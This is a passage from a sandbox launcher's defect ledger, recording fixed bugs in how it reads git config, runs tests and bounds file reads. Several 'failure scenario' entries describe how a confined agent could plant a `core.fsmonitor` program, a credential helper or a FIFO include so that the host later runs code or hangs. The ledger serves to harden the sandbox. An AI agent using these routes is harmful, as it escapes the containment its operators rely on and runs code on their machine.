- **Status: FIXED** (2026-11-03). The test unsets every `rvm_*` variable and `GEM_HOME`/`GEM_PATH`/`MY_RUBY_HOME`/`IRBRC` before any case, and its fake `rvm` records any host rvm variable that reaches it, which the test refuses. Seen red on a host whose shell exports them (all four `rvm_*` names reached it). Every case now runs with a `curl` that fails and records the call first on its base `PATH` (the bootstrap cases put their own fake ahead of it), and the test refuses any recorded call: with the empty-versions exit negated it fails on "fetched … get.rvm.io" instead of downloading and running the installer, and a second run of the rvm targets' mutants started no `keyboxd` (and took 7.8 s instead of 32.8 s). The debris the runs left in the developer's `~/.rvm` (a stub "ruby-3.4.5.tar.gz" and installer, their checksums, extract logs, empty temp directories) was removed.
- Severity: MEDIUM. Confidence: CONFIRMED (a leftover `keyboxd`, and files dated 07:24, 08:18 and 09:03 in a real `~/.rvm`).
- Location: `tests/test-rvm-reconcile.sh`.
- What's wrong: rvm reads `rvm_path` before `HOME`, and a developer shell with rvm installed exports it from its startup files, so overriding `HOME` did not confine rvm code: under a mutant, the reconcile worked in the real `~/.rvm`. No case stubbed `curl` except the bootstrap ones, though `run_case`'s comment said it did, and one case added the same day (`f7e6fad`, the `exit 0` assertion) ran with the host's `PATH` outright: a mutant that skipped the empty-versions exit, or the "rvm is installed" check, downloaded the rvm installer from get.rvm.io and ran it, which started a `keyboxd` that outlived the run. CI has no rvm, so only a developer host could see either.
- Fix direction: done as above.

## 20. Found while running PLAT-6

### TST-25: test-init-no-follow.sh cannot set itself up when run as root over another user's checkout
- **Status: FIXED** (2026-11-03) by `024c9f8` (#324), which makes the engine copy with `rsync -a --no-owner --no-group`, so as root it is root's and as a normal user nothing changes. PLAT-6 found the same defect independently, and made the same fix, which was dropped as a duplicate. In `ubuntu:22.04` as root, the test alone failed with `fatal: detected dubious ownership in repository at '/tmp/…/engine'`, from the ext4 checkout and from a `/mnt/c` one. With the fix it passes there and as a normal user.
- Severity: LOW (one test; but it kept CI's `suite-floor` and a local Phase 5 red). Confidence: CONFIRMED (reproduced from both checkouts)
- Location: `tests/test-init-no-follow.sh`, the engine copy (`rsync -a --no-owner --no-group --exclude='.git'`)
- Introduced: `6ce12fb` (PRJ-11), with the test.
- What's wrong: CI's `suite-floor` and `verify-on-host.sh`'s floor container run the suite as root over a checkout another user owns: uid 1001 for the runner, the developer's uid 1000 locally. As root, `rsync -a` keeps that owner on the copy, so git refuses to commit in it. Both environments trust every repository through `safe.directory`, but in the global config, which the test replaces with a `GIT_CONFIG_GLOBAL` of its own. So the scaffold failed (`SCAFFOLD-FAILED: engine repository`). `tests/test-sync-no-follow.sh` makes the same copy but runs no git in it.
- Fix direction: done as above.

## 21. Found while measuring GAP-2

A sample of sandbox.sh's mutants (174, `--jobs 10 --timeout 180`) run with `run.sh --select-oracles` on 2026-11-03, on the Linux developer host, at `12e2064`.

### TST-26: falsify's TIMEOUT note named `--timeout`, not the clock the set ran against
- **Status: FIXED** (2026-11-03). Each mutant's worker records the clock its set ran against (`FR_PID_CLOCK`), and the note prints it. Two checks in `tests/test-falsify-run.sh` section 11: a two-test set that hangs at `--timeout 1` must say "2s". A `--select-oracles` subset of one test that prints `FAIL:` and then hangs must say "2s" too, though its record names one test. The first was seen failing on the old code; the second against a variant that read the clock from the record.
- Severity: LOW (a report line; no verdict changed). Confidence: CONFIRMED (in the sample's stderr)
- Location: `tests/falsify/run.sh`, `fr_harvest()`
- Introduced: `92abb5f` (2026-08-21), which scaled the clock with the set's size and left the note naming `${FR_TIMEOUT}`.
- What's wrong: the clock is `--timeout` times the set's size (`fr_effective_timeout()`), and the note exists to show that a timeout ran at least as long as its clock (backlog F50). For a 24-test set at `--timeout 180` it printed "ran 4321.0s against a 180s clock (killed before the clock ran out)", so the relationship it was meant to show read as inverted.
- Fix direction: done as above.

### GIT-23: the 2 s read bound refuses a launch under load, and the refusal blames a FIFO
- **Status: FIXED** (2026-11-04), with the user's numbers, by another route than the fix direction below.
  - **What the reads get now:** a read gets 10 s while the launch's slow reads (past 2 s) have taken less than 30 s in all, and 2 s once they have.
  - **The count:** it is kept in a file of the launcher's own, because most reads run in a subshell. With no such file, or one that cannot be written, every read gets 2 s, as before.
  - **The refusal names its cause:** a file swapped for something else, a regular file that was slow, or a launch out of time for slow reads.
  - **Code:** `_rd()` and `_git_file_config()` both read through `_rd_run()`.
  - **Why not the retry:** the first fix built the retry the fix direction describes, a second try for up to 10 s with the output buffered in a file. Its review found two HIGH defects:
    - The buffer took the pipe's backpressure away, and with it the bound on the reader. A 17 KB config with a long subsection name lists to a large output within 2 s, and the launch's byte-at-a-time readers then took 30 s to minutes, unbounded. An 816 KB config listed 3.3 GB into TMPDIR.
    - A failed write to the buffer (a full disk) came back as an unset key instead of a refusal.
  - **Trade-off:** a FIFO swapped in is now refused after up to 10 s instead of 2.
  - **The redesign's review found a HIGH defect, fixed before commit:** `_rd_fail` formatted the bound with a command substitution that exits 1 for a whole number of seconds. Most reads run in `< <(…)`, which inherits errexit, so a cut-off read ended there with nothing printed and nothing refused, and read as unset. `_rd_fail` and `_rd_run` now run with `set +e`, and the bound is whole seconds. G86 and G99's unit cases call the functions as the launcher does, under `set -euo pipefail` through a process substitution, and failed on that code. G99's launch case now proves the slow read was read whole, by the `core.fsmonitor` its first protection names, and fails against a reverted bound.
  - **Smaller fixes from the same review:** `EPOCHREALTIME` keeps only its digits, because the decimal point is the locale's. No count directory is made in a subshell. The rescan after the session gets the first bound only. The refusal says "swapped for a FIFO, or removed".
  - **A race in the count, after commit:** a count that is not a regular file (or holds a line that is not a number) took the longer bound away only when a slow read tried to add to it, and whether a read cut off at its bound counted as slow was a race. G99's check of it failed once at the floor. `_rd_left()` now removes `ok` the moment it reads such a count.
  - **Tests:** G99 in test-git-internals-ro.sh (now `tests/test-git-internals-ro-reads.sh`) covers a launch with a config slow once, each bound and refusal on its own, the budget summed over several reads, and `_rd`. Each check was seen failing on the old code. G38 now compares with the same launch made with one include entry, not a fixed 15 s.
- Severity: LOW for the launcher (only a config of thousands of entries comes near the bound, and the refusal can be retried); it also makes test-git-internals-ro.sh (now `tests/test-git-internals-ro-config.sh`) load-sensitive, which a falsify run counts against its kills. Confidence: CONFIRMED (once, under load; not reproduced on demand)
- Location: sandbox.sh: `_rd_run()`, `_rd_fail()`, and `_git_file_config()`, which reads through `_rd_run`
- Introduced: `86427b0` (batch 10, G84/G86), which put every small git file read under a 2 s bound.
- What's wrong: `_git_file_config()` reads a protected config with `git config --file` under `timeout 2`, and a read cut off refuses the launch through `_rd_fail()`, as it should for a FIFO. But the bound is a time, so a regular file that is only slow to parse is refused too. In the sample, one of the two control runs (the pristine set, under the run's own 10 workers) failed in G38, whose config holds 5,000 include entries: `ERROR: …/proj/many38/.git/config could not be read within its bound (a FIFO swapped in, or too big); refusing the launch.` The file was neither a FIFO nor over the size limit. The run then exited 1 ("1 of 2 control run(s) FAILED"), and a mutant scored KILLED in that run may have been killed by the machine.
- Failure scenario: a launch on a host busy enough that `git config --list` of a large config takes over 2 s, such as a parallel test run, or a slow filesystem (WSL drvfs, a network home). The launch is refused, and the message names a cause that did not happen.
- Fix direction: on a cut-off read of a path that is still a regular file within the size limit, retry once with a longer bound before refusing, and say which happened ("took longer than 2 s" vs "not a regular file"). The FIFO case stays a refusal: a FIFO never becomes readable in time. G38's own 15 s threshold is load-sensitive in the same way.

### TST-27: G86's no-git checks passed under run-all.sh whatever the fallback's cap check did
- **Status: FIXED** (2026-11-03). The no-git `PATH` links the real `mktemp` (`RA_REAL_MKTEMP`, which `tests/run-all.sh` exports for this), and G86 first checks its premise: with that `PATH`, a config within the cap is read, not refused. Through `tests/run-all.sh`, the `||`→`&&` mutant of the cap check now fails both of G86's cap checks; before, it passed them.
- Severity: MEDIUM (a security check, the fallback's refusal of a config it cannot read whole, was unguarded in CI). Confidence: CONFIRMED (the mutant SURVIVED in `tests/falsify/run.sh` and passed G86 through `tests/run-all.sh`, and was killed when the test was run directly)
- Location: test-git-internals-ro.sh (now `tests/test-git-internals-ro-reads.sh`), G86 (`nogit_path()`)
- Introduced: with G86 (batch 10, `86427b0`).
- What's wrong: G86 builds a `PATH` with no git from `command -v` of the tools the fallback uses, `mktemp` among them. Under `tests/run-all.sh`, `mktemp` is its shim, a script starting `#!/usr/bin/env bash`, and that `PATH` has no bash. So `mktemp` failed, `_git_config_bool()` refused at its `mktemp` line (`snap="$(mktemp …)" || { _rd_fail "$1"; return 1; }`), and G86's "refuses a config past its read cap" passed with the cap check broken or gone. Run directly, outside `tests/run-all.sh`, the test caught it, which is how it looked tested. Found because GAP-2's sandbox.sh sample scored the cap check's mutants SURVIVED.
- Fix direction: done as above. G97, new, compares the fallback's answer with git's through the same `PATH`, over 18 configs, a missing file and one exactly at the cap.

### GIT-24: with no git on the host, the launcher reads git config with a parser that misreads it both ways
- **Status: FIXED** (2026-11-04), as the fix direction below says. Where git does not run, nothing reads a config. Both awk fallbacks are gone, and so are G86's fallback checks and G97. `config.worktree` is made and mounted in every repository. `_git_runs()` lists `hooks/` whatever `core.hooksPath` says. When a git directory is protected, one `WARNING:` names what went unchecked. The review of the fix added two things. Whether git runs is now asked by running it, once per launch (`_git_usable()`), because macOS keeps a `/usr/bin/git` that, without the Command Line Tools, only offers to install them and exits 1. And a launch where git does not run no longer spends a repository's one-time report of its keys, so the launch with git that the `WARNING:` asks for still names them. G98 in test-git-internals-ro.sh (now `tests/test-git-internals-ro-config.sh`) covers it. Each check was seen failing on the old code or against a mutant. Its re-review added six more. `_git_index_read()` asks `_git_usable()` itself, because a stale worktree's or an unreached submodule's index was still read through a git that does not run, five calls where one was meant. The probe expects a known answer, so a git older than 2.18 (no `--type=bool`) counts as none, and so does macOS's `/usr/bin/git` when the developer directory `xcode-select -p` names holds no `usr/bin/git`; that one is not run at all (PLAT-7). The rescan after the session names every repository the session made, its config unread. The `WARNING:` counts `.git` files too, whose git directory's index git would read. A launch where git does not run records `hooks:<path>`, so the next one does not name the hooks again under a false "did not report it", while a launch where git runs still names the keys. Each of these was seen failing on the code before it, or, for the probe's answer, the `.git`-file count and the hooks NOTE not repeated, against a mutant (a third review found those three checks vacuous at first). One case is not told apart: an engine before this fix, on a host where git did not run, recorded a repository as reported without reading a key, so its keys are not named once git is installed. Still unwarned: a subdirectory of a repository mounted alone, with nothing in it protected, whose enclosing index records a submodule there. The launch protects nothing, so it prints no `WARNING:`. An earlier fix, never committed, made the fallback fail safe instead (true unless git spells false). Its review showed true is not the cautious answer for every caller, so it was withdrawn.
- Severity: LOW to MEDIUM. Only a host with no git takes these paths, and there git itself runs nothing. But a git client that bundles its own git or libgit2 (GitKraken and the like) does run hooks there, and a git installed later would. Confidence: CONFIRMED (each spelling below measured against git 2.56, with the fallbacks extracted and run with git off `PATH`)
- Location: `sandbox.sh`, the awk fallbacks of `_git_config_bool()` (`r = (v == "true" || v == "yes" || v == "on" || (v ~ /^-?[0-9]+$/ && v + 0 != 0))`) and `_git_config_get()` ("the first `<name> = value` line of the key's section")
- Introduced: with the fallbacks, before the window this review covers.
- What's wrong: git's config syntax is more than either parser reads.
  - Read as false where git reads true: `"true"` and `tr"ue"` (git removes quotes), `1k` (a unit suffix), `+1` and `0x1` (`strtoimax` with base 0); a key written on its section's header line (`[extensions] worktreeConfig = true`); a comment after the header (`[extensions] ; c`, the key on the next line); a continued line (`noop = \` followed by `worktreeConfig = false` after a true value, which git reads as part of `noop`).
  - Read as true where git reads false, by a parser that defaults to true: an escaped or continued zero (`\t0`, `"\t0"`, `0\` then `k`), and `0b0` on a git built with glibc 2.38 or later.
  - `_git_config_get()` reads `core.hooksPath` and `core.worktree` with the same gaps.
- Why no single answer is safe: the three `_git_config_bool()` callers want different defaults. Making `config.worktree`'s placeholder and walking `config.worktree` want true when unsure. `_git_runs()`, which names the hooks git would run in the first-protection report and the after-session rescan, wants false. A true answer makes it read `config.worktree`'s `core.hooksPath` and skip listing `hooks/`. With no git, `_git_exec_keys()` finds nothing, so hooks are its only signal. Measured: with the fail-safe fallback, a repository whose config says `worktreeConfig = \t0` (git: false) and whose `config.worktree` sets `core.hooksPath` had its executable `hooks/pre-commit` go unnamed, though `git commit` runs it.
- Failure scenario: on a host with no git, an agent writes `worktreeConfig = "true"` into a repository's config, before its first protected launch or in a repository it makes. The launcher neither makes nor walks `config.worktree`, so a `core.fsmonitor` there, which git honours once the extension is on, is left writable.
- Fix direction: no parser when there is no git. Each caller takes its own cautious branch: make `config.worktree`'s placeholder and walk it in every repository, and in `_git_runs()` list `hooks/` whatever `core.hooksPath` says. Then delete both awk fallbacks, along with G86's fallback checks and G97, which test them, and say in AGENTS.md's git-internals paragraph what a launch on a host with no git does. A third review round found parser holes the first two missed, which argues against patching the parser instead.

## 22. Found while fixing GIT-24

Re-review of the GIT-24 fix, 2026-11-04, on the Linux developer host, at `f0ad913` plus the uncommitted fix.

### GIT-25: the pointer check runs git, unbounded, on a repository the agent can write
- **Status: FIXED** (2026-11-04). `_checkout_origin_url()` reads the checkout's `remote.origin.url` from its config file through `_git_file_config()` (bounded, no includes). The checkout is found as git finds it, the nearest `.git` at or above, and a `.git` file's `gitdir:` and a `commondir` are followed, read bounded. It reads only where `_git_usable()` succeeds, and only when `REPOS` holds a git-sourced repo to compare with. Of several URLs the first decides, an empty one emptying the list, as git reads them. A shorthand (`url.<base>.insteadOf`) is expanded as `get-url` expanded it, by `git ls-remote --get-url -- <url>` outside any repository: the registry always holds the expanded URL, because `repo.sh`'s seed container has no `~/.gitconfig` (review of the fix, MEDIUM: the first version compared the shorthand and refused a launch that had worked). `run_container()` asks `_git_usable()` first, in the launcher's own shell, so it is asked once per launch. Hermetic `tests/test-docs-path.sh`, the GIT-25 cases. The FIFO-include case went from rc=124 to a re-point. Each other case was seen red against its own mutant, and the old `git -C` call fails three of them, leaving no process behind (the bounded run kills its process group). The same launch's `_git_usable()` no longer takes macOS's git shim for git when `xcode-select -p` fails outright, as on a Mac that never had the Command Line Tools, nor when PATH reaches it as `/usr//bin/git` (`-ef`; reviews of the GIT-28 fix, and the shim case in `tests/test-docs-path.sh`).
- Severity: LOW (the launch hangs, nothing runs). Confidence: CONFIRMED (a config that includes a FIFO hung it; `timeout 3` gave rc=124)
- Location: sandbox.sh: `pointer_already_mounted_as()`, `want_url="$(git -C "$want" remote get-url origin 2>/dev/null || true)"`
- Introduced: `4dc252c` (2026-08-21), the git-sourced repo pointer check, before the bounded reads of GIT-10.
- What's wrong: on a launch that sets `VAULT_PATH`, `SPECS_PATH`, `DOCS_PATH` or `ARCHITECTURE_REPO_PATH` to an existing directory that is not a registered path-sourced repo (and, for the last three, not the primary), the launcher asks the pointer's checkout for its `origin` URL with a plain `git -C`. That reads the repository's config, includes and all, with no time bound. The same config is read everywhere else only through `_git_file_config()`, which is bounded and refuses a read cut off. It also runs a git that does not run (macOS's shim) without asking `_git_usable()`.
- Failure scenario: the agent runs `git init` in a vault that is not a repository, or edits one that is, and adds `[include] path = fifo` beside a FIFO. The next launch hangs before the overlay, and the message names nothing. `core.fsmonitor` was not run.
- Fix direction: read `remote.origin.url` through `_git_file_config()` from the checkout's config, resolving a `.git` file and a linked worktree's `commondir` as `git_dirs_in` does, and only where `_git_usable()`. `url.<base>.insteadOf` rewriting, which `get-url` applies, would then need applying by hand or dropping. The call sits in `$(…)`, so `_git_usable()` must have been asked in the launcher's own shell first (move the probe to the start of `run_container`).

### GIT-26: the build's provenance label runs git, unbounded, in the engine's directory
- **Status: FIXED** (2026-11-04). `_ac_source_commit()` reads `HEAD`, the branch's loose ref or `packed-refs`, a `.git` file's `gitdir:` and a `commondir` as files, and git never runs. Each read goes through `_ac_read_bounded()`: 3 s, the reader killed at the bound, and a read cut off gives no label and a `NOTE:`. A `.git` file and a `commondir` are trimmed of CR and LF only, and `HEAD` and a ref of whitespace, as git trims them. `packed-refs` is read a line at a time, each cut at 4200 bytes, from a `cat` killed at the bound (`_ac_packed_ref()`). awk held a line whole, and one that was the whole file took gigabytes within the bound (review of the fix, L1). Checking its size first, the next fix, left a race between the check and the open (second review). The fix also covers what the entry did not name: git walked up from a project's `.ai-containers/` to the project's repository, so every project image recorded the project's commit as the engine's, against docs/multiple-projects.md. A commit is now recorded only for an engine tree, one holding `project-init.sh` (the rule `version_engine()` goes by), so a port's `base/` still records its repository's. Not read: the reftable format, and a ref that is itself symbolic. Hermetic `tests/test-provenance.sh`, the GIT-26 checks; the FIFO cases went from rc=124 to green, and each other check was seen red against its own mutant.
- Severity: LOW. Confidence: PLAUSIBLE (from code, by analogy with GIT-25, which was reproduced)
- Location: sandbox-common.sh: `ai_containers_provenance_labels()`, `commit="$(git -C "$dir" rev-parse HEAD 2>/dev/null || true)"`
- What's wrong: every `./build.sh` asks git for the engine directory's commit with a plain `git -C`. A project's `.ai-containers/` lies inside the project's repository, so git reads that repository's config, includes and all, with no time bound. The launch mounts that config read-only, but an include in it can name a file the agent can write (which the launch only warns about). Like GIT-25, it also runs macOS's git shim without asking whether git runs, which on a Mac without the Command Line Tools opens their installer at every build.
- Failure scenario: an include in the project's `.git/config` names a path in the project that the agent replaces with a FIFO. The next `./build.sh` (and `./runme.sh`, which builds first) hangs, and the message names nothing.
- Fix direction: read `HEAD` without git, as `repo-git-reset.sh` reads branch tips (a `.git` file and `commondir` resolved, `refs/heads/<branch>` or `packed-refs`), or run git with `GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null` and a bound, falling back to no label.

### GIT-28: `version_engine` runs `git describe --dirty` in the engine checkout, which runs what its config names
- **Status: FIXED** (2026-11-04). Git reads nothing of the engine checkout but its objects (`_ver_git_version()`), and `--version` no longer reports `-dirty`, which needs the index and the worktree (the user's choice, after the fifth review below). It finds the checkout as git does, the nearest `.git` at or above, and follows a `.git` file's `gitdir:` and a `commondir`, each read bounded. HEAD, the branch it names and the tags are read here as data, never through a link, and each line is kept only with an object id: loose refs at most 512 bytes, 100 of each read by bash, `packed-refs` at most 2 MiB, picked by `grep`, and `shallow` at most 1 MiB, all in time linear in their size. A link, or a loose branch that is not a regular file, gives no answer. Of the config only `extensions.objectFormat`, `extensions.refStorage` (a reftable repository is not read) and `core.abbrev` are read, by `git config --file`, no includes, each at a value git takes for it. `describe --tags`, and the short commit when no tag describes HEAD, then run in a bare git directory made for the purpose. It holds those refs as `packed-refs` and `HEAD`, in the repository's object format and the files ref format, whatever the user's defaults (`GIT_DEFAULT_REF_FORMAT=files`). Its objects are reached through links to `pack/` and the fan-out directories only, so `objects/info/alternates` is never read. There is no transport (`GIT_ALLOW_PROTOCOL=none`, `GIT_NO_LAZY_FETCH=1`), and git allocates at most 64 MiB at a time (`GIT_ALLOC_LIMIT`). Every call has a 10 s bound (`_ver_run()`, the command killed at the bound, a `NOTE:` when `describe` is cut off), and the command a call started is killed even when the shell has no descriptor left for it. An interrupt or a hangup kills the running command, which ignores SIGINT, and removes the directory. Nothing runs on a Mac whose `/usr/bin/git` would open the Command Line Tools' installer (`_ver_git_runs()`). So nothing the checkout's config names can run, and nothing planted there is read whole.

  The review of the fix found five more things, all fixed:
  - M1: a value with a newline in it (`eol = "lf\ncore.fsmonitor x"`) carried `core.fsmonitor` into the check, and git ran it.
  - M2: an index linked to `/dev/zero` was copied into TMPDIR for as long as the bound allowed, and an interrupt left the copy behind.
  - L2: when `xcode-select -p` fails outright, as on a Mac that never had the tools, the check tested the shim's own `/usr/bin/git`. `sandbox.sh`'s `_git_usable()` (GIT-24) did the same and is fixed with it; `tests/test-docs-path.sh` checks that.
  - L3: a split index, and a default object format other than the repository's, were never called dirty.
  - L4: two ledger claims did not hold. One is now killed; the other was re-measured under `set -u`.

  A third review found one more MEDIUM and four LOWs, all fixed:
  - MEDIUM: `-c protocol.allow=never` did not stop a lazy fetch. An included `protocol.file.allow=always` beat it, and with HEAD's commit missing in a partial clone, `describe` ran the remote's `uploadpack`. Only `GIT_NO_LAZY_FETCH` stopped it, which git ignores before 2.39.4 unless the distribution backported it.
  - An interrupt during the first call left git blocked on a FIFO include: a process substitution ignores SIGINT. The INT traps now kill the command running at that moment (`_ver_stop()`, `_ver_cur`), which is never a process already reaped.
  - A split index in a port's `base/` was read from the wrong path (`--path-format=absolute`).
  - The copy's cap was 256 MiB under `POSIXLY_CORRECT` (`set +o posix`).
  - The shim's `/usr/bin/git` was compared as a string, so `/usr//bin/git` passed. It is now compared with `-ef`, in `sandbox.sh` too.

  A fourth review found the MEDIUM not closed. `GIT_ALLOW_PROTOCOL=none` stops a transport, not the lazy fetch starting. The `git fetch` it starts reads the checkout's config. It handles `fetch.bundleURI` through `git-remote-https`, which the allow-list does not gate, and runs a `credential.helper = !cmd` and `core.askPass` on a 401: measured, a request to a local server and the helper run four times. Each review had found one more key in that config, so git now never reads it: the design above. The same review found the shared index's path read relative to the wrong directory on git older than 2.31, and `_ac_packed_ref()` leaving its reader after a match, a reader the rewrite no longer has. Measuring the rewrite under `ulimit -n 10` found a command `_ver_run` had started writing on into a removed TMPDIR when the shell had no descriptor left for it, leaving the directory behind; it is now killed and reaped.

  A fifth review, of that design, found nothing that ran a program, and three MEDIUMs. Each copied file was read by git through the links the agent planted: a ref linked to `/dev/zero` took git to gigabytes within the bound. Hard links and a read-only directory under `refs/tags` filled TMPDIR, and left directories `rm -rf` could not remove. A user's `init.defaultRefFormat=reftable` made every answer `unknown`. Rather than copy the checkout's files at all, the refs are now read as data, and `-dirty`, the one part that needed the index, is gone (the user's choice). With it went the dirty-check findings of the earlier rounds: filters and fsmonitor in the refresh, a split index's path, the index copy's cap. Its LOWs went the same way, and two were fixed: the copy that outlived an interrupt, and a long config loop (the config now yields three keys or no answer). The rest is accepted: the search for `.git` crosses filesystem boundaries where git stops, and git still follows a link inside the objects directory (to `/net/<host>` on a Mac with the automounter, a host the agent names).

  A sixth review found nothing that ran a program or reached the network, and two MEDIUMs and a third that was borderline, all fixed (the user chose to fix them and review once more):
  - Trimming trailing newlines in bash was quadratic in their number, and loops in bash ran over the agent's `packed-refs`. A planted 2 MiB of newlines held `--version`, every sync and `project-init.sh` for hours, and SIGINT waited on it. The trim is gone, and `grep` picks the lines.
  - A forged loose object declaring 1.5 GiB took git to that much memory (`GIT_ALLOC_LIMIT`).
  - `shallow` was not carried, so on a clone whose tags were fetched to a depth of their own, git walked past the shallow boundary to a tag git itself cannot reach.
  - Testing the fix found one more: a single empty loose tag made every answer `unknown`, as the loop that read the tags returned the last read's failure.

  A seventh review found every one of those closed, nothing that ran a program or reached the network, and three more MEDIUMs, all fixed:
  - `git config --file` had no allocation cap, and a port's `base/` mounted alone leaves its config writable: a value padded by a sparse 3 GiB took git config to gigabytes. It runs with `GIT_ALLOC_LIMIT` too.
  - The recorded `engine-version` was read with `head -1`, before any bound: a sparse file of no newline held `--version`, `project-init.sh` and every sync for hours, and a FIFO swapped in after the `-f` test held them for good. It is read through `_ver_read()`, at most 4096 bytes, still its first line with whitespace dropped. This read predates the window; it was found here.
  - A caller killed alone left the subshell to die of SIGPIPE at its answer, which was printed before its temporary directory was removed. The directory is now removed first.
  - And one of its LOWs: a loose tag written without its newline was skipped, where git reads it.

  Accepted, from its LOWs: the HEAD and branch trims are quadratic, at most 4 KiB each (about 2 s on bash 5.3). The time bound comes before the 16 MiB output cap. After a full 16 MiB read the command is waited for unbounded. More than 2000 loose tags, a `packed-refs` over 2 MiB, or more than 20 000 lines give `unknown` or a truncated set, and an unreadable directory under `refs/tags` gives `unknown`. The 2 MiB check counts characters, not bytes. These differ from git: alternates (`clone --shared`, `--reference`), replace refs and grafts, a linked `objects/pack`, a branch that is a symref, and `core.abbrev` set in an include or as `false`. A planted `.git` whose `gitdir:` holds a newline can make the objects directory's `info/alternates` read, or on a Mac reach `/net/<host>`, as a link inside the objects directory can. Race swaps can cost about 14 calls of 10 s each. An interrupt in the instant between a command's start and `_ver_cur` being set leaves it running.

  Hermetic `tests/test-version.sh`, the GIT-28 checks. The fsmonitor, clean-filter, FIFO-include, fetch and macOS-shim checks were red before, and each other check was seen red against its own mutant. The falsify tier on `version.sh`: 137 of 139 killed, the 2 left classified EQUIVALENT in `tests/falsify/survivors.txt`; the deep pass 85 of 86, the last UNPROVEN (the search for `.git` made endless, which the oracle's first unbounded call cannot survive). Those counts were measured on bash 5.3, and CI's ratchet failed on `cd36db1` (bash 5.2, Ubuntu 24.04): four mutants survived there, of `_ver_stop()`'s kill, of `_ver_cur` being set, and of the kill on `_ver_run()`'s exec failure. Bash before 5.3 does not make a process substitution ignore SIGINT, so a group's interrupt killed the command without the trap. And dash, Ubuntu's `sh`, wrote no pid file with ten descriptors, so that check passed with the kill removed. A new check sends each signal to the subshell alone, and the other takes the command from `$!`. Each was seen red against those mutants on bash 5.1, 5.2 and 5.3.
- Severity: LOW. Confidence: CONFIRMED (in a fixture repository, a `core.fsmonitor` in `.git/config` ran on `git describe --tags --dirty --always` after a `touch` of a tracked file, and `-c core.fsmonitor=false` still ran a clean filter; `git rev-parse HEAD` and `describe` without `--dirty` ran neither; git 2.56)
- Location: version.sh: `version_engine()`, then `v="$(git -C "$dir" describe --tags --dirty 2>/dev/null || true)"`
- Introduced: `734e75b` (2026-08-26), `--version`.
- What's wrong: `--dirty` refreshes the index, which runs `core.fsmonitor`, and the clean filter of a file whose stat changed. `version_engine` runs it in an engine tree (one holding `project-init.sh`: this repository's checkout, or a port's `base/` inside its repository) on `./sandbox.sh --version`, and from `project-init.sh` and `sync-to-projects.sh`, which record the version into every project. Git reads the checkout's config whole, includes and all, with no bound. Where the engine checkout is a writable mount root (allowed, with a `NOTE:`), the launch protects its `.git/config` but only warns about an include in it that names a file the agent can write. Like GIT-26, it also runs macOS's git shim without asking whether git runs.
- Failure scenario: the engine checkout is the working directory of a launch, and its config includes a file in the checkout. The agent writes `[core] fsmonitor = <program>` into that file. The next `./sandbox.sh --version` or `./sync-to-projects.sh` on the host runs the program. A FIFO in the file's place hangs them instead.
- Fix direction: done as above.

## 23. Found while running PLAT-5

`PHASES=5 bash ./verify-on-host.sh` on macOS 26.6 (Apple Silicon, Homebrew bash 5.3.20, openrsync), Colima 29.5.2 (Virtualization.Framework, virtiofs), at `8abf9a2`, 2026-11-03. 4 of 118 files failed on the host and 1 of 118 at the floor, each again when run alone.

### GIT-27: a repository removed and made again within a second is not reported again
- **Status: FIXED** (2026-11-04). `_git_ident()` takes the birth time to the nanosecond (`stat -c '%d %i %.9W'`, BSD `stat -f '%d %i %.9FB'`). G93 was red at the floor in `ubuntu:22.04` on Colima on every run before, and is green there and on macOS after. GAP-12 is unreleased, so no `git-reported.conf` in the old format has shipped.
- Severity: LOW (a one-time `NOTE:` naming a repository's config keys and hooks is not printed). Confidence: CONFIRMED (in the floor container: `rm -rf` then `mkdir` of `/tmp/a` gave `46 4325438 1793735695` both times; `%.9W` gave `…849127350` and `…851127478`)
- Location: `sandbox.sh`, `_git_ident()`
- Introduced: `7121741` (GAP-12).
- What's wrong: the record of reported repositories names one by device, inode and birth time so that one made again at a reported path is new even where the filesystem reuses the inode. The birth time was in whole seconds, and overlayfs gave the re-made directory its inode back within the same second, so it matched the record and its keys and hooks were not named. G93's last check does exactly that and failed; CI's `suite-floor` passed it, so inode reuse there is luck.
- Fix direction: done as above. Busybox `stat` supports neither form, as it supported neither before.

### TST-28: four hermetic tests failed on macOS for reasons the product does not have
- **Status: FIXED** (2026-11-04). Each is green on macOS after the fix and unchanged on Linux.
- Severity: LOW (tests only; they kept the local layer's Phase 5 red on every Mac). Confidence: CONFIRMED (each reproduced alone)
- What's wrong, and the fix:
  - `tests/test-layer-checks-parser.sh`: `paste -sd'|'` with no file operand. BSD `paste` prints its usage and exits 1 without `-`; GNU reads stdin. Now `paste -sd'|' -`, the form every other `paste -s` in `tests/` uses.
  - `tests/test-agent-tools-reconcile.sh` ("an uncontended lock announced a wait") and `tests/test-blocked-capture.sh` (12 checks): the scripts run in the container, which has util-linux `flock`; macOS has none. `flock -n 9` failed, so the reconcile announced a wait, and every DNS-map write in `capture-blocked-traffic.sh` failed, so the map stayed empty. Where the host has no `flock`, each test now puts a stand-in on its fake `PATH` that takes no lock: `flock <file> <cmd…>` runs the command, `flock [-n] <fd>` succeeds. On Linux the real `flock` runs as before.
  - `tests/test-launcher-dir-ro.sh`, T46's LNCH-4 check: APFS refuses a name that is not UTF-8 (`Illegal byte sequence`), so the fixture was never made and the launch had nothing to refuse. Where the filesystem refuses it, the candidate is now named with a `:` and a CR, which no form of the bind carries either. On macOS the check goes red with the LNCH-4 discount reverted (`lbuild[$la]=yes; continue 2` in place of `lbuild[$la]=no`), as does the pin check after it.

### TST-30: G119's lookup count failed on macOS, BSD `wc` padding the number
- **Status: FIXED** (2026-11-07). Found running `tests/test-git-internals-ro-reads.sh` on macOS for GIT-41.
- Severity: LOW (test only). Confidence: CONFIRMED.
- What's wrong, and the fix: `wc -l < file` prints `       1` with BSD `wc`, and the check compared it as a string with `1` and `3`, so it failed with the right counts. Its neighbours compare two padded counts with each other and passed. Now an arithmetic test, `(( g1_119 == 1 && g4_119 == 3 ))`, which reads the padded number. Unchanged on Linux.

## 24. Found while reviewing the PLAT-7 instructions

An Opus reviewer read the rewritten PLAT-7 steps against the code, 2026-11-05, at `3e75c50` plus the uncommitted edits.

### GIT-29: sync and init run the host's git in the project's repository
- **Status: FIXED** (2026-11-06), by fix A (the user's choice).
  - **The fix:** `project-files.sh: ensure_ai_containers_ignored()` asks git nothing about the project's repository.
    - A work tree is a `.git` at the project's root. A `.git` file is read by the GIT-30 rule (`_proj_ptr()`).
